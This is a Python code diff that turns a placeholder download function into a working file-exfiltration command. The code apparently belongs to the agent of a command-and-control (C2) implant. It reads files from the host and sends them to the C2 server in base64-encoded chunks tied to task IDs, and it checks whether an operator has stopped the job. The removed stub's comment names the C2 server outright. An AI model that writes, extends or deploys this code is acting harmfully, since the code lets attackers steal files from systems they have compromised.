@@ -1,18 +1,48 @@
-import os
+    def download(self, task_id, file):
+        file_path = file if file[0] == os.sep \
+                else os.path.join(self.current_directory,file)
 
-def download(task_id, path):
-    try:
-        if not os.path.exists(path):
-            return f"Error: File not found at {path}"
+        file_size = os.stat(file_path).st_size 
+        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)
 
-        with open(path, "rb") as f:
-            file_content = f.read()
+        data = {
+            "action": "post_response", 
+            "responses": [{
+                "task_id": task_id,
+                "download": {
+                    "total_chunks": total_chunks,
+                    "full_path": file_path,
+                    "chunk_size": CHUNK_SIZE
+                }
+            }]
+        }
+        initial_response = self.postMessageAndRetrieveResponse(data)
+        file_id = initial_response["responses"][0]["file_id"]
+        chunk_num = 1
+        with open(file_path, 'rb') as f:
+            while True:
+                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
+                    return "Job stopped."
 
-        # In a real scenario, you would send this to the C2 server
-        # For now, we'll just return a success message and the size
-        return f"Successfully read {len(file_content)} bytes from {path} for download."
+                content = f.read(CHUNK_SIZE)
+                if not content:
+                    break # done
 
-    except Exception as e:
-        return f"Error downloading file: {str(e)}"
-
-
+                data = {
+                    "action": "post_response", 
+                    "responses": [
+                        {
+                            "task_id": task_id,
+                            "download": {
+                                "chunk_num": chunk_num,
+                                "file_id": file_id,
+                                "chunk_data": base64.b64encode(content).decode()
+                            }
+                        }
+                    ]
+                }
+                chunk_num+=1
+                response = self.postMessageAndRetrieveResponse(data)
+        return json.dumps({
+            "agent_file_id": file_id
+        })
